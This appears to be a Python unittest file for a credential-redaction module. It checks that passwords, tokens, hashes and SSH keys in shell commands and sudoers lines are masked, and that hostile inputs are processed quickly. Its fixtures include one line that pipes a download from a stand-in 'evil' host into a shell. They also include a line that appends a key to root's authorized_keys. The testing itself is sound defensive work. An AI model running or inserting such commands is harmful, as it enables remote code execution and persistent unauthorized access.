import unittest

from discover_agent import redact

CASES = [
    ("mysqldump -pS3cret db", "mysqldump -p*** db"),
    ("mysql --password=S3cret", "mysql --password=***"),
    ("PGPASSWORD=S3cret pg_dump x", "PGPASSWORD=*** pg_dump x"),
    ("curl https://u:S3cret@h/x", "curl https://u:***@h/x"),
    ("tcp://r:6379?auth=S3cret", "tcp://r:6379?auth=***"),
    ("API_TOKEN=abc ./run", "API_TOKEN=*** ./run"),
    ("MAILTO=admin@ex.com", "MAILTO=admin@ex.com"),
    ("tcp://h:6379?auth[]=user&auth[]=S3cret", "tcp://h:6379?auth[]=***&auth[]=***"),
    ("tcp://h:6379?auth[user]=u&auth[pass]=S3cret", "tcp://h:6379?auth[user]=***&auth[pass]=***"),
    ("/usr/bin/php -v", "/usr/bin/php -v"),
    ("tar -cpf a.tar /srv", "tar -cpf a.tar /srv"),
    ("ls -p /tmp", "ls -p /tmp"),
]


class RedactTest(unittest.TestCase):
    def test_table(self):
        for source, expected in CASES:
            with self.subTest(source=source):
                self.assertEqual(redact.redact(source), expected)

    def test_none_passes_through(self):
        self.assertIsNone(redact.redact(None))

    def test_mask_constant(self):
        self.assertEqual(redact.MASK, "***")

    def test_mysql_family_and_sshpass(self):
        for source, expected in [
            ("/usr/bin/mariadb -uroot -pS3cret db", "/usr/bin/mariadb -uroot -p*** db"),
            ("mariadb-dump -pS3cret", "mariadb-dump -p***"),
            ("sshpass -pS3cret ssh h", "sshpass -p*** ssh h"),
            ("0 3 * * * root mysql -u r -pS3cret -e 'x'", "0 3 * * * root mysql -u r -p*** -e 'x'"),
            ("mysqldump -p", "mysqldump -p"),
        ]:
            with self.subTest(source=source):
                self.assertEqual(redact.redact(source), expected)

    def test_long_password_options(self):
        self.assertEqual(redact.redact("x --passwd=a --pwd=b"), "x --passwd=*** --pwd=***")
        self.assertEqual(redact.redact("x --password 'a b'"), "x --password ***")

    def test_url_password_with_special_chars(self):
        self.assertEqual(
            redact.redact("deb https://u:p@ss:w@h/ubuntu noble main"),
            "deb https://u:***@h/ubuntu noble main",
        )

    def test_url_query_secrets(self):
        self.assertEqual(
            redact.redact("https://h/x?a=1&token=abc&password=zz&b=2"),
            "https://h/x?a=1&token=***&password=***&b=2",
        )

    def test_assignment_markers_are_case_insensitive_and_exported(self):
        self.assertEqual(redact.redact("export db_secret=abc"), "export db_secret=***")
        self.assertEqual(redact.redact("AWS_SECRET_ACCESS_KEY=abc"), "AWS_SECRET_ACCESS_KEY=***")

    def test_quoted_assignment_value(self):
        self.assertEqual(redact.redact('X_TOKEN="a b c" run'), 'X_TOKEN=*** run')

    def test_multiline(self):
        self.assertEqual(
            redact.redact("MAILTO=a@b.c\nPGPASSWORD=x pg_dump"),
            "MAILTO=a@b.c\nPGPASSWORD=*** pg_dump",
        )

    def test_idempotent(self):
        once = redact.redact("mysql -pS3cret https://u:p@h API_TOKEN=a")
        self.assertEqual(redact.redact(once), once)


# (source, strings that must not survive)
LEAKS = [
    ("Environment=DB_PASSWORD=S3cret", ["S3cret"]),
    ("docker run --env=API_TOKEN=S3cret img", ["S3cret"]),
    ("app --opts=a,password=S3cret", ["S3cret"]),
    ("FOO=bar;API_TOKEN=S3cret", ["S3cret"]),
    ("DSN='host=db password=S3cret' run", ["S3cret"]),
    ("mysql -p'ab&cd;ef|gh' db", ["ab", "cd", "ef", "gh"]),
    ('mysqldump -p"a;SECRETTAIL" db', ["SECRETTAIL"]),
    ("sshpass -p 'ab;SECRETTAIL' ssh h", ["SECRETTAIL"]),
    ('mysql -e "select 1; show tables" -pS3cret', ["S3cret"]),
    ("mysql -h db -u 'a|b' -pS3cret", ["S3cret"]),
    ("PGPASSWORD = S3cret", ["S3cret"]),
    ("API_KEY = abc", ["abc"]),
    ("SECRET_X=a b c", ["a b c", " c"]),
    ('PASS="a"TAIL run', ["TAIL"]),
    ('PASS="a\\"b TAIL" run', ["TAIL"]),
    ("PASS='it'\\''s TAIL' run", ["TAIL"]),
    ("app --token S3cret", ["S3cret"]),
    ("app --api-key S3cret", ["S3cret"]),
    ("app --http-password S3cret", ["S3cret"]),
    ("password: S3cret", ["S3cret"]),
    ('{"password":"S3cret"}', ["S3cret"]),
    ("sshpass -pS3cret ssh -p 22 h", ["S3cret"]),
    ("sshpass -v -p S3cret ssh h", ["S3cret"]),
    ("sshpass -P assword -p S3cret ssh h", ["S3cret"]),
    ("sshpass -e -pS3cret ssh", ["S3cret"]),
    ("sshpass -d 3 -pS3cret ssh", ["S3cret"]),
    ('Environment="DB_PASSWORD=x S3cret"', ["S3cret"]),
    ('curl -d "{\\"password\\":\\"S3cret\\"}" https://h', ["S3cret"]),
    ('mysql "-pS3cret" db', ["S3cret"]),
    ("mysql '-pS3cret' db", ["S3cret"]),
    ("# mysql don't\nmysql -pS3cret -e 'x'", ["S3cret"]),
    ("curl -H 'X-Api-Key:S3cret' https://h", ["S3cret"]),
    ("curl -H X-Auth-Token:S3cret https://h", ["S3cret"]),
    ("password:S3cret", ["S3cret"]),
    ("token:S3cret", ["S3cret"]),
    ("DB_PASSWORD:S3cret", ["S3cret"]),
    ("--password:S3cret", ["S3cret"]),
    ("mysql -u root \\\n  -pS3cret db", ["S3cret"]),
    ("mysqldump \\\n -pS3cret --all db > f", ["S3cret"]),
    ("PASSWORD=\\\nS3cret run", ["S3cret"]),
    ("sshpass \\\n -p S3cret ssh h", ["S3cret"]),
    ("app --password -S3cret", ["S3cret"]),
    ("app --token -S3cret x", ["S3cret"]),
    ("usermod -p '$6$salt$HASHTAIL' bob", ["$6$", "HASHTAIL"]),
    ("echo 'bob:$6$salt$HASHTAIL' | chpasswd -e", ["$6$", "HASHTAIL"]),
    ('usermod -p "\\$6\\$salt\\$HASHTAIL" bob', ["HASHTAIL"]),
    ("x $1$salt$HASHTAIL", ["HASHTAIL"]),
    ("x $2b$10$HASHTAIL", ["HASHTAIL"]),
    ("x $5$salt$HASHTAIL", ["HASHTAIL"]),
    ("x $y$j9T$salt$HASHTAIL", ["HASHTAIL"]),
    ("x $gy$j9T$salt$HASHTAIL", ["HASHTAIL"]),
    ("x $argon2id$v=19$m=65536$HASHTAIL", ["HASHTAIL"]),
    ("echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKEYTAIL >> /root/.ssh/authorized_keys", ["KEYTAIL", "AAAAC3"]),
    ("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABKEYTAIL==' >> k", ["KEYTAIL", "AAAAB3"]),
    ("x $6$salt$HASHTAIL", ["HASHTAIL"]),
    ("x $6$saltonly", ["saltonly"]),
    ("x $2y$10$HASHTAIL", ["HASHTAIL"]),
    ("x $6$rounds=5000$salt$HASHTAIL", ["HASHTAIL", "rounds"]),
    ("x $6$sa/lt$HASHTAIL", ["HASHTAIL"]),
    ("x $6$sa.lt$HASHTAIL", ["HASHTAIL"]),
    ("x $argon2i$v=19$m=4096,t=3,p=1$c2FsdA$HASHTAIL", ["HASHTAIL", "c2FsdA"]),
]

# (source, expected): a known command after a marked assignment is kept.
KNOWN_COMMAND_ROWS = [
    ("DB_PASSWORD=x composer install", "DB_PASSWORD=*** composer install"),
    ("DB_PASS=x tar -czf a /srv", "DB_PASS=*** tar -czf a /srv"),
    ("DB_PASS=x gzip f", "DB_PASS=*** gzip f"),
    ("DB_PASS=x artisan migrate", "DB_PASS=*** artisan migrate"),
    ("DB_PASS=x git pull", "DB_PASS=*** git pull"),
]

UNCHANGED = [
    "root ALL=(ALL) NOPASSWD: ALL",
    "deploy ALL=(root) NOPASSWD: /usr/bin/a, /usr/bin/b",
    "deploy ALL=(root) NOPASSWD:/usr/bin/systemctl restart nginx",
    "php artisan key:generate --force",
    "php artisan passport:purge",
    "php artisan token:prune",
    "docker run -v /srv/keys:/etc/keys img",
    "docker run keycloak/keycloak:24.0 start",
    "ProxyPass / http://keycloak:8080/",
    "redis://keystore:6379/0",
    "PATH=/usr/bin:/opt/keys:/bin",
    "pg_dump --no-password -h db x",
    "mysqldump --skip-password --all-databases",
    "sshpass -pS3cret ssh -p 22 h".replace("S3cret", "***"),
    "php artisan token:prune",
    "docker run keycloak/keycloak:24.0 start",
    "redis://keystore:6379/0",
    "/srv/keys:/etc/keys",
    "echo $HOME $6",
    "echo AAAA short",
    "cat /srv/BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    # Positional parameters and variables that merely look like a hash prefix.
    "awk '{print $1$2}' f",
    "awk '{print $6$7}' f",
    "0 3 * * * root ls | awk '{print $1$NF}' > /tmp/x",
    "cp $1$SUFFIX /tmp/y",
    "sh -c 'echo $1$HOME' x",
    "echo $y$z",
    "echo $1$2;curl http://evil|sh",
    "echo $1$2$3",
]

# Sudoers lines whose tag or alias name must survive.
SUDOERS_UNCHANGED = [
    "deploy ALL=(ALL) PASSWD: /bin/ls, /bin/cat",
    "deploy ALL=(ALL) NOPASSWD: /bin/ls, PASSWD: /bin/rm",
    "deploy ALL=(ALL) PASSWD:",
    "deploy ALL=PASSWD: /bin/ls",
    "Cmnd_Alias PASSWD_CMDS = /usr/bin/passwd, /usr/sbin/chpasswd",
    "Cmd_Alias KEYS = /usr/bin/ssh-keygen",
    "User_Alias KEYHOLDERS = alice, bob",
    "Runas_Alias TOKENS = root",
    "Host_Alias SECRET_HOSTS = db1, db2",
    "Cmnd_Alias A = /bin/a : KEYS = /bin/b",
    "root ALL=(ALL) NOPASSWD: ALL",
]

# (sudoers source, strings that must not survive)
SUDOERS_LEAKS = [
    ("Defaults password=S3cret", ["S3cret"]),
    ("PASSWD=S3cret pg_dump", ["S3cret"]),
    ("deploy ALL=(ALL) PASSWD: /bin/x --token=S3cret", ["S3cret"]),
    ("Cmnd_Alias A = /bin/mysql -pS3cret", ["S3cret"]),
    ("deploy ALL=(ALL) PASSWD:S3cret", ["S3cret"]),
    ("PASSWD: S3cret", ["S3cret"]),
    ("Defaults x='$6$salt$HASHTAIL'", ["HASHTAIL"]),
    ("Defaults mailerpath=\x000\x00 password=S3cret", ["S3cret", "\x00"]),
]


class LeakTest(unittest.TestCase):
    def test_secrets_are_gone_and_masking_is_idempotent(self):
        for source, secrets in LEAKS:
            with self.subTest(source=source):
                out = redact.redact(source)
                for secret in secrets:
                    self.assertNotIn(secret, out)
                self.assertEqual(redact.redact(out), out)

    def test_known_commands_after_assignment(self):
        from discover_agent.redact import _KNOWN_COMMANDS

        for name in ("composer", "artisan", "git", "tar", "gzip"):
            self.assertIn(name, _KNOWN_COMMANDS)
        for source, expected in KNOWN_COMMAND_ROWS:
            with self.subTest(source=source):
                out = redact.redact(source)
                self.assertEqual(out, expected)
                self.assertEqual(redact.redact(out), out)

    def test_unchanged_lines(self):
        for source in UNCHANGED:
            with self.subTest(source=source):
                self.assertEqual(redact.redact(source), source)

    def test_quote_does_not_span_lines(self):
        self.assertEqual(
            redact.redact("# mysql don't\nmysql -pS3cret -e 'x'"),
            "# mysql don't\nmysql -p*** -e 'x'",
        )

    def test_quoted_value_keeps_closing_quote(self):
        self.assertEqual(
            redact.redact('Environment="DB_PASSWORD=x S3cret"'), 'Environment="DB_PASSWORD=***"'
        )

    def test_closing_quote_of_a_hash_survives(self):
        self.assertEqual(redact.redact("usermod -p '$6$salt$abc' bob"), "usermod -p '***' bob")
        self.assertEqual(redact.redact("echo 'bob:$6$salt$abc' | chpasswd -e"), "echo 'bob:***' | chpasswd -e")

    def test_command_after_a_hash_survives(self):
        self.assertEqual(redact.redact("echo $6$salt$abc;curl http://h"), "echo ***;curl http://h")

    def test_lookalike_chain_is_bounded(self):
        # The bound that keeps the lookahead linear: longer chains are masked, not rescanned.
        self.assertEqual(redact.redact("echo " + "$1" * 9), "echo " + "$1" * 9)
        self.assertEqual(redact.redact("echo " + "$1" * 11), "echo ***")

    def test_sshpass_keeps_later_ssh_port(self):
        self.assertEqual(
            redact.redact("sshpass -pS3cret ssh -p 22 h"), "sshpass -p*** ssh -p 22 h"
        )

    def test_known_command_after_assignment_is_kept(self):
        self.assertEqual(redact.redact("DB_PASS=x /opt/run.sh"), "DB_PASS=*** /opt/run.sh")


class SudoersTest(unittest.TestCase):
    def test_tags_and_alias_names_are_kept(self):
        for line in SUDOERS_UNCHANGED:
            with self.subTest(line=line):
                self.assertEqual(redact.redact_sudoers(line), line)

    def test_values_are_masked(self):
        for source, secrets in SUDOERS_LEAKS:
            with self.subTest(source=source):
                out = redact.redact_sudoers(source)
                for secret in secrets:
                    self.assertNotIn(secret, out)

    def test_plain_redact_still_masks_passwd_assignments(self):
        self.assertEqual(redact.redact("PASSWD=S3cret pg_dump x"), "PASSWD=*** pg_dump x")

    def test_hostile_inputs_finish_quickly(self):
        import time

        for text in ("PASSWD: " * 40_000, "Cmnd_Alias A = /x " + ": B = /y " * 30_000, "Cmnd_Alias " + " " * 300_000):
            with self.subTest(head=text[:20]):
                start = time.monotonic()
                redact.redact_sudoers(text)
                self.assertLess(time.monotonic() - start, 1.0)


class HostileInputTest(unittest.TestCase):
    PIECES = [
        "?key", "a-a-a-", "://", "://:", "u:p@://", "@", "PASS=", 'X_PASS="\n',
        "pass=1 ", "mysql ", "mysql -p'", "sshpass ", "-p ", "Authorization:   ",
        "'", '"', "\\", "--token ", "password:   ", "{\"key\":\"", "&token=", "a" * 50,
        "$6$", "$6", "$argon2id", "$argon2id$", "$", "AAAA", "AAAA ", "A=", "AAAA" + "b" * 15 + " ",
        "$1", "$y", "$1$A", "$1$a", "$1\\", "$6$ab", "$1$A=", "$1$2$3 ",
    ]

    MIXED = [
        " " * 100_000 + "PASS=1 ./y " * 10_000,
        "\t" * 100_000 + "PASS=1 sh " * 10_000,
        " " * 100_000 + "PASS='1' " * 11_000,
        " " * 100_000 + "mysql -p'a' " * 8_000,
        " " * 100_000 + "sshpass -v -d 3 " * 6_000,
        'Environment="' + "PASS=x " * 30_000,
        "\\\"password\\\":" * 12_000,
        "--pass " * 30_000,
        "password:password:" * 12_000,
        "x_key:" * 40_000,
        "\\\n" * 100_000,
        "mysql \\\n" * 25_000,
        "$argon2" + "x" * 200_000,
        "$1$ " * 50_000,
        "A" * 200_000 + "=",
    ]

    def test_mixed_hostile_inputs_finish_quickly(self):
        import time

        for text in self.MIXED:
            with self.subTest(head=text[-20:]):
                start = time.monotonic()
                redact.redact(text)
                self.assertLess(time.monotonic() - start, 1.0)

    def test_large_hostile_inputs_finish_quickly(self):
        import time

        for piece in self.PIECES:
            text = piece * (200_000 // len(piece))
            with self.subTest(piece=piece):
                start = time.monotonic()
                redact.redact(text)
                self.assertLess(time.monotonic() - start, 1.0)


# Measured leaks: (source, exact result).
CREDENTIAL_ROWS = [
    ("https://ghp_xxx@github.com/x", "https://***@github.com/x"),
    ("git clone https://ghp_xxx@github.com/x.git /srv", "git clone https://***@github.com/x.git /srv"),
    ("deb https://TOKEN:@packagecloud.io/x noble main", "deb https://***:@packagecloud.io/x noble main"),
    ("http://TOKEN@h/x", "http://***@h/x"),
    ("ftp://TOKEN:@h/x", "ftp://***:@h/x"),
    ("HTTPS://TOKEN@h/x", "HTTPS://***@h/x"),
    ("git+https://TOKEN@github.com/x", "git+https://***@github.com/x"),
    ("url=https://TOKEN@h/x", "url=https://***@h/x"),
    ("https://t1@a/x,https://t2@b/y", "https://***@a/x,https://***@b/y"),
    ("https://u:S3cret@h/x", "https://u:***@h/x"),
    ("https://me@corp.com:S3cret@h/x", "https://***@corp.com:***@h/x"),
    ("mysql://root:@localhost/db", "mysql://root:***@localhost/db"),
    ("curl -u admin:S3cret https://h", "curl -u admin:*** https://h"),
    ("curl --user admin:S3cret https://h", "curl --user admin:*** https://h"),
    ("curl --user=admin:S3cret https://h", "curl --user=admin:*** https://h"),
    ("curl -uadmin:S3cret https://h", "curl -uadmin:*** https://h"),
    ("curl -su admin:S3cret https://h", "curl -su admin:*** https://h"),
    ("curl -fsSLuadmin:S3cret https://h", "curl -fsSLuadmin:*** https://h"),
    ("/usr/bin/curl -u 'admin:S3 cret' https://h", "/usr/bin/curl -u 'admin:***' https://h"),
    ('curl -u "admin:S3cret"', 'curl -u "admin:***"'),
    ("curl -u sk_live_abc: https://h", "curl -u ***: https://h"),
    ("curl -u TOKENONLY https://h", "curl -u *** https://h"),
    ("0 3 * * * root curl -s -u a:S3cret h; ls -u x", "0 3 * * * root curl -s -u a:*** h; ls -u x"),
    ("redis-cli -a S3cret ping", "redis-cli -a *** ping"),
    ("redis-cli -h db -p 6380 -a 'S3 cret' ping", "redis-cli -h db -p 6380 -a *** ping"),
    ("/usr/bin/app -token S3cret", "/usr/bin/app -token ***"),
    ("/usr/bin/app -api-key S3cret --x", "/usr/bin/app -api-key *** --x"),
    ("app -password 'a b' run", "app -password *** run"),
    ("docker login -p S3cret", "docker login -p ***"),
    ("docker login -u bob -p S3cret reg.example", "docker login -u bob -p *** reg.example"),
    ("docker login -pS3cret reg", "docker login -p*** reg"),
    ("docker --config /x login -p S3cret", "docker --config /x login -p ***"),
]

CREDENTIAL_UNCHANGED = [
    "mysql -u root",
    "mysql -u root db",
    "ssh -a host",
    "ls -a /tmp",
    "ssh://git@host/x",
    "git clone ssh://git@github.com/x.git",
    "git@github.com:x",
    "git clone git@github.com:x/y.git",
    "git+ssh://git@github.com/x",
    "https://github.com/x/y.git",
    "https://h/x@y",
    "https://h/?to=a@b.c",
    "https://@h/x",
    "su -u root",
    "sudo -u www-data php x",
    "crontab -u root -l",
    "curl --user-agent bob https://h",
    "curl -o u https://h",
    "curl -XPUT https://h",
    "docker run -p 80:80 nginx",
    "docker compose up -p x",
    "docker ps -a",
    "docker-compose -p x up",
    "scurl -u a:b",
    "app --no-password -x",
    "app -no-password x",
    "app -skip-token x",
    "tar -czf a.tar /srv",
    "find / -name x",
]


class UrlPathAtSignTest(unittest.TestCase):
    def test_an_at_sign_in_the_path_is_not_a_credential(self):
        for url in ("https://registry.npmjs.org/@babel/core", "https://host:8080/pkg@1.2", "https://host/pkg@1.2"):
            with self.subTest(url=url):
                self.assertEqual(redact.redact(url), url)

    def test_real_credentials_are_still_masked(self):
        cases = {
            "https://user:S3cret@host/x": "https://user:***@host/x",
            "https://ghp_tok@github.com/a": "https://***@github.com/a",
            "https://me@corp:S3cret@host": "https://***@corp:***@host",
            "https://user:@host": "https://***:@host",
            "https://user:123@host/pkg@1.2": "https://user:***@1.2",
            "mysql://u:p@h:3306/db": "mysql://u:***@h:3306/db",
        }
        for url, expected in cases.items():
            with self.subTest(url=url):
                self.assertEqual(redact.redact(url), expected)


class CredentialFormsTest(unittest.TestCase):
    def test_rows(self):
        for source, expected in CREDENTIAL_ROWS:
            with self.subTest(source=source):
                out = redact.redact(source)
                self.assertEqual(out, expected)
                self.assertEqual(redact.redact(out), out)

    def test_unchanged(self):
        for source in CREDENTIAL_UNCHANGED:
            with self.subTest(source=source):
                self.assertEqual(redact.redact(source), source)

    def test_hostile_inputs_finish_quickly(self):
        import time

        pieces = [
            "curl -u a:b ", "curl ", "curl -u ", "curl --user ", "-su ", "curl -uuuuu", "curl '",
            "redis-cli -a ", "redis-cli ", "docker login -p ", "docker login ", "docker ", "docker -p ",
            "-token ", "-token", "-key -key ", "https://a@", "https://a:@", "https://", "http://a@b ",
            "git+https://", "+", "a+https://x@", "-p ",
        ]
        for piece in pieces:
            text = piece * (200_000 // len(piece))
            with self.subTest(piece=piece):
                start = time.monotonic()
                redact.redact(text)
                self.assertLess(time.monotonic() - start, 1.0)


if __name__ == "__main__":
    unittest.main()
